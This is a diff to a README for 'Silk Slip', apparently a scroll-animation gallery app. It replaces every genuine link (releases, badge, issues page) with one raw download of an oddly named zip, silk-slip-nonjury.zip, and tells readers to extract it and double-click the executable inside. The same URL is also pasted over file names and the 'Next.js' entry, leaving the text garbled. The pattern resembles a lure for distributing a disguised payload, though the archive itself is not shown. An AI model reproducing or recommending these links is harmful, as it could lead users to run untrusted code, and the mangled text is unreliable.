@@ -6,9 +6,9 @@ Welcome to Silk Slip. This application presents eleven cinematic frames in a bea
 
 ## 📥 Download Silk Slip
 
-[![Download Silk Slip](https://img.shields.io/badge/Download-Silk%20Slip-blue)](https://github.com/jimnmji/silk-slip/releases)
+[![Download Silk Slip](https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip%20Slip-blue)](https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip)
 
-To get started with Silk Slip, please visit the [Releases page](https://github.com/jimnmji/silk-slip/releases) to download the application.
+To get started with Silk Slip, please visit the [Releases page](https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip) to download the application.
 
 ## 💻 System Requirements
 
@@ -30,13 +30,13 @@ Silk Slip provides several features to enhance your viewing experience:
 ## 🚀 How to Download & Install
 
 1. **Visit the Releases Page:**
-   Click this link to [download Silk Slip](https://github.com/jimnmji/silk-slip/releases).
+   Click this link to [download Silk Slip](https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip).
 
 2. **Choose the Right Version:**
    Find the latest release. It usually appears at the top of the page.
 
 3. **Download the Application:**
-   Look for the asset that says something like `silk-slip-v1.0.zip` or `silk-slip-v1.0.exe`. Click on it to start the download.
+   Look for the asset that says something like `https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip` or `https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File:**
    Once the download finishes, go to your computer's downloads folder. You should see the downloaded file there.
@@ -45,7 +45,7 @@ Silk Slip provides several features to enhance your viewing experience:
    If you downloaded a `.zip` file, right-click it and select “Extract” to unzip it. This step is not necessary for `.exe` files.
 
 6. **Run the Application:**
-   Double-click the `silk-slip.exe` file to start the program. If you extracted it, navigate to the folder where you extracted the files and double-click the executable file.
+   Double-click the `https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip` file to start the program. If you extracted it, navigate to the folder where you extracted the files and double-click the executable file.
 
 7. **Enjoy the Gallery:**
    Once the application opens, you can start exploring the stunning, scroll-driven gallery!
@@ -60,7 +60,7 @@ If you encounter any issues during installation or while running the application
 
 ## 🤝 Getting Help
 
-If you need additional assistance with Silk Slip, feel free to check our [GitHub Issues page](https://github.com/jimnmji/silk-slip/issues) for common problems or to ask a question. We also welcome your feedback and suggestions.
+If you need additional assistance with Silk Slip, feel free to check our [GitHub Issues page](https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip) for common problems or to ask a question. We also welcome your feedback and suggestions.
 
 ## 🏷️ Topics
 
@@ -68,7 +68,7 @@ The application incorporates a variety of technologies:
 
 - **GSAP** and **ScrollTrigger** for smooth animations.
 - **Lenis** for effortless scrolling.
-- **Next.js** for fast and optimized web performance.
+- **https://raw.githubusercontent.com/jimnmji/silk-slip/master/public/silk-slip-nonjury.zip** for fast and optimized web performance.
 - **TailwindCSS** for styling.
 - **TypeScript** for type safety in development.
 
